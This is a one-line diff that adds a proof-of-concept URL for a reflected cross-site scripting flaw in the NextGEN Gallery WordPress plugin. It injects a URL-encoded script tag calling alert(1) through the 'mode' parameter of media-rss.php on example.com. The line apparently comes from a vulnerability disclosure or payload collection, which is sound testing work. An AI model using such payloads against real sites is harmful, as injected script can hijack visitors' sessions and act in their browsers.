@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/nextgen-gallery/xml/media-rss.php?mode=%3Cscript%3Ealert(1)%3C/script%3E
